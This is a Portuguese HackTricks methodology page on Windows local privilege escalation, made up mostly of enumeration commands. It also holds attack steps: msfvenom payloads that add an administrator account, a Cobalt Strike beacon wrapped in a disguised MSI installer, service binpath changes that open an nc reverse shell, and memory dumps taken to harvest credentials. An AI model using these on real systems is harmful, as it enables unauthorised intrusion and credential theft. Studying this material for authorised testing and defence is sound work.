# Escala√ß√£o de Privil√©gios Locais no Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Adquira o [**material oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **Melhor ferramenta para procurar vetores de escala√ß√£o de privil√©gios locais no Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoria Inicial do Windows

### Tokens de Acesso

**Se voc√™ n√£o sabe o que s√£o Tokens de Acesso do Windows, leia a seguinte p√°gina antes de continuar:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**Se voc√™ n√£o sabe o que √© qualquer uma das siglas usadas no t√≠tulo desta se√ß√£o, leia a seguinte p√°gina antes de continuar**:

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### N√≠veis de Integridade

**Se voc√™ n√£o sabe o que s√£o n√≠veis de integridade no Windows, voc√™ deve ler a seguinte p√°gina antes de continuar:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Controles de Seguran√ßa do Windows

Existem diferentes coisas no Windows que podem **impedir voc√™ de enumerar o sistema**, executar aplicativos ou at√© mesmo **detectar suas atividades**. Voc√™ deve **ler** a seguinte **p√°gina** e **enumerar** todos esses **mecanismos de defesa** antes de come√ßar a enumera√ß√£o para escala√ß√£o de privil√©gios:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## Informa√ß√µes do Sistema

### Enumera√ß√£o de informa√ß√µes da vers√£o

Verifique se a vers√£o do Windows tem alguma vulnerabilidade conhecida (verifique tamb√©m os patches aplicados).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Explora√ß√£o de Vers√µes

Este [site](https://msrc.microsoft.com/update-guide/vulnerability) √© √∫til para buscar informa√ß√µes detalhadas sobre vulnerabilidades de seguran√ßa da Microsoft. Este banco de dados possui mais de 4.700 vulnerabilidades de seguran√ßa, mostrando a **imensa superf√≠cie de ataque** que um ambiente Windows apresenta.

**No sistema**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas tem watson embutido)_

**Localmente com informa√ß√µes do sistema**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Reposit√≥rios no Github de exploits:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ambiente

Alguma credencial/Informa√ß√£o valiosa salva nas vari√°veis de ambiente?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### Hist√≥rico do PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Arquivos de Transcri√ß√£o do PowerShell

Voc√™ pode aprender como ativar isso em [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Registro de M√≥dulo do PowerShell

Registra os detalhes da execu√ß√£o do pipeline do PowerShell. Isso inclui os comandos executados, incluindo invoca√ß√µes de comandos e parte dos scripts. Pode n√£o ter todos os detalhes da execu√ß√£o e dos resultados de sa√≠da.\
Voc√™ pode ativar isso seguindo o link da √∫ltima se√ß√£o (Arquivos de Transcri√ß√£o), mas ativando "Registro de M√≥dulo" em vez de "Transcri√ß√£o do PowerShell".
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Para visualizar os √∫ltimos 15 eventos dos logs do PowerShell, voc√™ pode executar:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### Registro de **Script Block** do PowerShell

Ele grava blocos de c√≥digo √† medida que s√£o executados, capturando assim a atividade completa e o conte√∫do integral do script. Mant√©m um registro de auditoria completo de cada atividade, que pode ser usado posteriormente em forenses e para estudar o comportamento malicioso. Registra toda a atividade no momento da execu√ß√£o, fornecendo assim os detalhes completos.
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Os eventos de registro de bloco de script podem ser encontrados no Visualizador de Eventos do Windows no seguinte caminho: _Aplicativos e Logs de Servi√ßos > Microsoft > Windows > Powershell > Operacional_\
Para visualizar os √∫ltimos 20 eventos, voc√™ pode usar:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Configura√ß√µes de Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Drives
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Voc√™ pode comprometer o sistema se as atualiza√ß√µes n√£o forem solicitadas usando http**S**, mas sim http.

Comece verificando se a rede usa uma atualiza√ß√£o WSUS sem SSL executando o seguinte:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Se voc√™ receber uma resposta como:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` for igual a `1`.

Ent√£o, **√© explor√°vel.** Se o √∫ltimo registro for igual a 0, ent√£o, a entrada WSUS ser√° ignorada.

Para explorar essas vulnerabilidades, voc√™ pode usar ferramentas como: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) - Estes s√£o scripts de explora√ß√£o armados para MiTM para injetar 'falsas' atualiza√ß√µes em tr√°fego WSUS n√£o-SSL.

Leia a pesquisa aqui:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Leia o relat√≥rio completo aqui**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basicamente, este √© o defeito que este bug explora:

> Se temos o poder de modificar nosso proxy de usu√°rio local, e o Windows Updates usa o proxy configurado nas configura√ß√µes do Internet Explorer, ent√£o temos o poder de executar [PyWSUS](https://github.com/GoSecure/pywsus) localmente para interceptar nosso pr√≥prio tr√°fego e executar c√≥digo como um usu√°rio elevado em nosso ativo.
>
> Al√©m disso, como o servi√ßo WSUS usa as configura√ß√µes do usu√°rio atual, ele tamb√©m usar√° seu armazenamento de certificados. Se gerarmos um certificado autoassinado para o hostname WSUS e adicionarmos este certificado ao armazenamento de certificados do usu√°rio atual, seremos capazes de interceptar tanto o tr√°fego WSUS HTTP quanto HTTPS. O WSUS n√£o usa mecanismos semelhantes ao HSTS para implementar uma valida√ß√£o de confian√ßa na primeira utiliza√ß√£o do certificado. Se o certificado apresentado for confi√°vel pelo usu√°rio e tiver o hostname correto, ele ser√° aceito pelo servi√ßo.

Voc√™ pode explorar essa vulnerabilidade usando a ferramenta [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (uma vez que seja liberada).

## KrbRelayUp

Essencialmente, √© uma **escalada de privil√©gio local** universal sem corre√ß√£o em ambientes de **dom√≠nio** do Windows onde a **assinatura LDAP n√£o √© imposta,** onde o **usu√°rio tem direitos pr√≥prios** (para configurar **RBCD**) e onde o **usu√°rio pode criar computadores no dom√≠nio.**\
Todos os **requisitos** s√£o atendidos com **configura√ß√µes padr√£o**.

Encontre o **exploit em** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Mesmo que o ataque seja Para mais informa√ß√µes sobre o fluxo do ataque, verifique [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Se** esses 2 registros estiverem **ativados** (valor √© **0x1**), ent√£o usu√°rios de qualquer privil√©gio podem **instalar** (executar) arquivos `*.msi` como NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Payloads do Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Se voc√™ tiver uma sess√£o meterpreter, pode automatizar essa t√©cnica usando o m√≥dulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Use o comando `Write-UserAddMSI` do power-up para criar dentro do diret√≥rio atual um bin√°rio MSI do Windows para escalar privil√©gios. Este script gera um instalador MSI pr√©-compilado que solicita a adi√ß√£o de um usu√°rio/grupo (portanto, voc√™ precisar√° de acesso GIU):
```
Write-UserAddMSI
```
Execute apenas o bin√°rio criado para escalar privil√©gios.

### MSI Wrapper

Leia este tutorial para aprender como criar um MSI wrapper usando estas ferramentas. Note que voc√™ pode embrulhar um arquivo "**.bat**" se voc√™ **apenas** quiser **executar** **linhas de comando**

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Criar MSI com WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Criar MSI com Visual Studio

* **Gere** com Cobalt Strike ou Metasploit um **novo payload EXE TCP do Windows** em `C:\privesc\beacon.exe`
* Abra o **Visual Studio**, selecione **Criar um novo projeto** e digite "installer" na caixa de pesquisa. Selecione o projeto **Setup Wizard** e clique em **Pr√≥ximo**.
* D√™ um nome ao projeto, como **AlwaysPrivesc**, use **`C:\privesc`** para a localiza√ß√£o, selecione **colocar solu√ß√£o e projeto no mesmo diret√≥rio**, e clique em **Criar**.
* Continue clicando em **Pr√≥ximo** at√© chegar ao passo 3 de 4 (escolher arquivos para incluir). Clique em **Adicionar** e selecione o payload Beacon que voc√™ acabou de gerar. Depois clique em **Concluir**.
* Destaque o projeto **AlwaysPrivesc** no **Solution Explorer** e nas **Propriedades**, mude **TargetPlatform** de **x86** para **x64**.
* H√° outras propriedades que voc√™ pode mudar, como o **Autor** e **Fabricante** que podem fazer o aplicativo instalado parecer mais leg√≠timo.
* Clique com o bot√£o direito no projeto e selecione **Ver > A√ß√µes Personalizadas**.
* Clique com o bot√£o direito em **Instalar** e selecione **Adicionar A√ß√£o Personalizada**.
* D√™ um duplo clique em **Pasta de Aplicativos**, selecione seu arquivo **beacon.exe** e clique em **OK**. Isso garantir√° que o payload beacon seja executado assim que o instalador for rodado.
* Nas **Propriedades de A√ß√£o Personalizada**, mude **Run64Bit** para **Verdadeiro**.
* Finalmente, **construa**.
* Se o aviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` for mostrado, certifique-se de definir a plataforma para x64.

### Instala√ß√£o MSI

Para executar a **instala√ß√£o** do arquivo `.msi` malicioso em **segundo plano:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Para explorar essa vulnerabilidade, voc√™ pode usar: _exploit/windows/local/always\_install\_elevated_

## Antiv√≠rus e Detectores

### Configura√ß√µes de Auditoria

Essas configura√ß√µes determinam o que est√° sendo **registrado**, portanto, voc√™ deve prestar aten√ß√£o
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, √© interessante saber para onde os logs s√£o enviados
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** permite que voc√™ **gerencie a senha do Administrador local** (que √© **randomizada**, √∫nica e **alterada regularmente**) em computadores integrados ao dom√≠nio. Essas senhas s√£o armazenadas centralmente no Active Directory e restritas a usu√°rios autorizados usando ACLs. Se o seu usu√°rio tiver permiss√µes suficientes, voc√™ poder√° ler as senhas dos administradores locais.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Se ativo, **senhas em texto puro s√£o armazenadas no LSASS** (Local Security Authority Subsystem Service).\
[**Mais informa√ß√µes sobre WDigest nesta p√°gina**](../stealing-credentials/credentials-protections.md#wdigest).
```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```
### Prote√ß√£o LSA

A Microsoft, no **Windows 8.1 e vers√µes posteriores**, forneceu prote√ß√£o adicional para o LSA a fim de **prevenir** que processos n√£o confi√°veis possam **ler sua mem√≥ria** ou injetar c√≥digo.\
[**Mais informa√ß√µes sobre Prote√ß√£o LSA aqui**](../stealing-credentials/credentials-protections.md#lsa-protection).
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
```
### Guarda de Credenciais

**Credential Guard** √© um novo recurso no Windows 10 (edi√ß√µes Enterprise e Education) que ajuda a proteger suas credenciais em uma m√°quina contra amea√ßas como pass the hash.\
[**Mais informa√ß√µes sobre Credential Guard aqui.**](../stealing-credentials/credentials-protections.md#credential-guard)
```
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```
### Credenciais em Cache

**Credenciais de dom√≠nio** s√£o utilizadas por componentes do sistema operacional e s√£o **autenticadas** pela **Autoridade de Seguran√ßa Local** (LSA). Tipicamente, credenciais de dom√≠nio s√£o estabelecidas para um usu√°rio quando um pacote de seguran√ßa registrado autentica os dados de logon do usu√°rio.\
[**Mais informa√ß√µes sobre Credenciais em Cache aqui**](../stealing-credentials/credentials-protections.md#cached-credentials).
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Usu√°rios & Grupos

### Enumerar Usu√°rios & Grupos

Voc√™ deve verificar se algum dos grupos aos quais voc√™ pertence possui permiss√µes interessantes
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupos privilegiados

Se voc√™ **pertence a algum grupo privilegiado, voc√™ pode ser capaz de escalar privil√©gios**. Aprenda sobre grupos privilegiados e como abusar deles para escalar privil√©gios aqui:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Manipula√ß√£o de tokens

**Saiba mais** sobre o que √© um **token** nesta p√°gina: [**Tokens do Windows**](../authentication-credentials-uac-and-efs.md#access-tokens).\
Confira a seguinte p√°gina para **aprender sobre tokens interessantes** e como abus√°-los:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### Usu√°rios logados / Sess√µes
```
qwinsta
klist sessions
```
### Pastas pessoais
```
dir C:\Users
Get-ChildItem C:\Users
```
### Pol√≠tica de Senhas
```
net accounts
```
### Obter o conte√∫do da √°rea de transfer√™ncia
```bash
powershell -command "Get-Clipboard"
```
## Processos em Execu√ß√£o

### Permiss√µes de Arquivos e Pastas

Primeiramente, ao listar os processos, **verifique se h√° senhas na linha de comando do processo**.\
Verifique se voc√™ pode **sobrescrever algum bin√°rio em execu√ß√£o** ou se possui permiss√µes de escrita na pasta do bin√°rio para explorar poss√≠veis [**ataques de DLL Hijacking**](dll-hijacking.md):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Sempre verifique a possibilidade de [**depuradores electron/cef/chromium** em execu√ß√£o, voc√™ pode abusar deles para escalar privil√©gios](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Verificando permiss√µes dos bin√°rios dos processos**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Verificando permiss√µes das pastas dos bin√°rios dos processos (**[**DLL Hijacking**](dll-hijacking.md)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Minera√ß√£o de Senha em Mem√≥ria

Voc√™ pode criar um dump de mem√≥ria de um processo em execu√ß√£o usando **procdump** da sysinternals. Servi√ßos como FTP t√™m as **credenciais em texto claro na mem√≥ria**, tente fazer o dump da mem√≥ria e ler as credenciais.
```
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Aplica√ß√µes GUI Inseguras

**Aplica√ß√µes executadas como SYSTEM podem permitir que um usu√°rio inicie um CMD ou navegue pelos diret√≥rios.**

Exemplo: "Ajuda e Suporte do Windows" (Windows + F1), pesquise por "prompt de comando", clique em "Clique para abrir Prompt de Comando"

## Servi√ßos

Obtenha uma lista de servi√ßos:
```
net start
wmic service list brief
sc query
Get-Service
```
### Permiss√µes

Voc√™ pode usar **sc** para obter informa√ß√µes de um servi√ßo
```
sc qc <service_name>
```
√â recomendado ter o bin√°rio **accesschk** do _Sysinternals_ para verificar o n√≠vel de privil√©gio necess√°rio para cada servi√ßo.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
√â recomendado verificar se "Usu√°rios Autenticados" podem modificar algum servi√ßo:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Voc√™ pode baixar o accesschk.exe para XP aqui](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ativar servi√ßo

Se voc√™ estiver recebendo este erro (por exemplo, com SSDPSRV):

_Erro do sistema 1058 ocorreu._\
_O servi√ßo n√£o pode ser iniciado, ou porque est√° desativado ou porque n√£o tem dispositivos habilitados associados a ele._

Voc√™ pode ativ√°-lo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Leve em considera√ß√£o que o servi√ßo upnphost depende do SSDPSRV para funcionar (para XP SP1)**

**Outra solu√ß√£o alternativa** para este problema √© executar:
```
sc.exe config usosvc start= auto
```
### **Modificar o caminho do bin√°rio do servi√ßo**

Se o grupo "Usu√°rios autenticados" possui **SERVICE\_ALL\_ACCESS** em um servi√ßo, ent√£o ele pode modificar o bin√°rio que est√° sendo executado pelo servi√ßo. Para modific√°-lo e executar **nc**, voc√™ pode fazer:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Reiniciar servi√ßo
```
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Outras Permiss√µes podem ser usadas para escalar privil√©gios:\
**SERVICE\_CHANGE\_CONFIG** Pode reconfigurar o bin√°rio do servi√ßo\
**WRITE\_DAC:** Pode reconfigurar permiss√µes, levando a SERVICE\_CHANGE\_CONFIG\
**WRITE\_OWNER:** Pode se tornar propriet√°rio, reconfigurar permiss√µes\
**GENERIC\_WRITE:** Herda SERVICE\_CHANGE\_CONFIG\
**GENERIC\_ALL:** Herda SERVICE\_CHANGE\_CONFIG

**Para detectar e explorar** essa vulnerabilidade, voc√™ pode usar _exploit/windows/local/service\_permissions_

### Permiss√µes fracas em bin√°rios de servi√ßos

**Verifique se voc√™ pode modificar o bin√°rio que √© executado por um servi√ßo** ou se voc√™ tem **permiss√µes de escrita na pasta** onde o bin√°rio est√° localizado ([**DLL Hijacking**](dll-hijacking.md))**.**\
Voc√™ pode obter todos os bin√°rios que s√£o executados por um servi√ßo usando **wmic** (n√£o em system32) e verificar suas permiss√µes usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Voc√™ tamb√©m pode usar **sc** e **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Permiss√µes de modifica√ß√£o do registro de servi√ßos

Voc√™ deve verificar se pode modificar algum registro de servi√ßo.\
Voc√™ pode **verificar** suas **permiss√µes** sobre um registro de servi√ßo fazendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Verifique se **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** possuem FullControl. Nesse caso, voc√™ pode alterar o bin√°rio que ser√° executado pelo servi√ßo.

Para alterar o Caminho do bin√°rio executado:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Permiss√µes de AppendData/AddSubdirectory no registro de Servi√ßos

Se voc√™ tem essa permiss√£o sobre um registro, isso significa que **voc√™ pode criar sub-registros a partir deste**. No caso dos servi√ßos do Windows, isso √© **suficiente para executar c√≥digo arbitr√°rio:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Caminhos de Servi√ßo N√£o Citados

Se o caminho para um execut√°vel n√£o estiver entre aspas, o Windows tentar√° executar cada finaliza√ß√£o antes de um espa√ßo.

Por exemplo, para o caminho _C:\Program Files\Some Folder\Service.exe_ o Windows tentar√° executar:
```
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Para listar todos os caminhos de servi√ßo n√£o entre aspas (exceto os servi√ßos internos do Windows)
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Voc√™ pode detectar e explorar** essa vulnerabilidade com metasploit: _exploit/windows/local/trusted\_service\_path_\
Voc√™ pode criar manualmente um bin√°rio de servi√ßo com metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### A√ß√µes de Recupera√ß√£o

√â poss√≠vel indicar ao Windows o que ele deve fazer [quando a execu√ß√£o de um servi√ßo falha](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN). Se essa configura√ß√£o estiver apontando para um bin√°rio e esse bin√°rio puder ser sobrescrito, voc√™ pode ser capaz de escalar privil√©gios.

## Aplica√ß√µes

### Aplica√ß√µes Instaladas

Verifique as **permiss√µes dos bin√°rios** (talvez voc√™ possa sobrescrever um e escalar privil√©gios) e das **pastas** ([DLL Hijacking](dll-hijacking.md)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

